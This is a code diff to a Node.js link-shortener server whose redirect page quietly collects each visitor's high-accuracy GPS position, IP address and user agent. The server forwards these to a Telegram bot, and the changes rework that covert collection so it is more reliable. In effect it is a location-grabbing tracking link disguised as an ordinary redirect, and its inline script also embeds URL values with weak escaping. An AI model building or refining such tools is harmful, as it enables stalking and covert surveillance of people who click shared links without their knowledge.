@@ -53,8 +53,9 @@ async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
       { chat_id: TELEGRAM_CHAT_ID, text: msg }
     );
+    console.log('[Telegram] Message sent successfully');
   } catch (err) {
-    console.error('Telegram Error:', err.message);
+    console.error('[Telegram] Error:', err.message);
   }
 }
 
@@ -73,16 +74,20 @@ app.post('/api/shorten', (req, res) => {
   res.json({ shortened: shortenedUrl, code: shortCode });
 });
 
-// API لتسجيل الموقع (في الخلفية)
+// API لتسجيل الموقع
 app.post('/api/log-visit', (req, res) => {
   const { code, gps } = req.body;
   
+  console.log('[Log] Visit logged:', { code, gps });
+  
   if (linkStorage[code]) {
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
     const userAgent = req.get('user-agent');
     const originalUrl = linkStorage[code].original;
     
     linkStorage[code].clicks++;
+    
+    // أرسل بدون انتظار
     sendToTelegram(ip, code, originalUrl, userAgent, gps);
   }
   
@@ -96,56 +101,77 @@ app.get('/:code', (req, res) => {
 
   const originalUrl = linkStorage[code].original;
   
-  // HTML بـ redirect فوري + GPS في الخلفية
   res.send(`
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
   <title>Redirecting...</title>
+</head>
+<body>
   <script>
     (function() {
       const code = '${code}';
       const originalUrl = '${originalUrl.replace(/'/g, "\\'")}';
+      const apiUrl = '${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log-visit';
       
       // Redirect فوري
       window.location.href = originalUrl;
       
-      // GPS في الخلفية
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const gps = {
-              lat: position.coords.latitude,
-              lng: position.coords.longitude,
-              accuracy: position.coords.accuracy
-            };
-            
-            // أرسل بدون انتظار الرد
-            navigator.sendBeacon(
-              '${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log-visit',
-              JSON.stringify({ code, gps })
-            );
-          },
-          () => {
-            // لو GPS فشل، أرسل بدون موقع
-            navigator.sendBeacon(
-              '${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log-visit',
-              JSON.stringify({ code })
-            );
-          }
-        );
-      } else {
-        // لو ما في GPS support
-        navigator.sendBeacon(
-          '${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log-visit',
-          JSON.stringify({ code })
-        );
-      }
+      // جمع GPS في الخلفية
+      setTimeout(() => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              // أرسل GPS
+              fetch(apiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  code: code,
+                  gps: {
+                    lat: position.coords.latitude,
+                    lng: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                  }
+                }),
+                keepalive: true
+              }).catch(e => console.log('Fetch error:', e));
+            },
+            (error) => {
+              // لو فشل GPS، أرسل بدونه
+              fetch(apiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  code: code,
+                  gps: null
+                }),
+                keepalive: true
+              }).catch(e => console.log('Fetch error:', e));
+            },
+            { 
+              enableHighAccuracy: true,
+              timeout: 3000,
+              maximumAge: 0
+            }
+          );
+        } else {
+          // لو ما في GPS
+          fetch(apiUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              code: code,
+              gps: null
+            }),
+            keepalive: true
+          }).catch(e => console.log('Fetch error:', e));
+        }
+      }, 100);
     })();
   </script>
-</head>
-<body></body>
+</body>
 </html>
   `);
 });
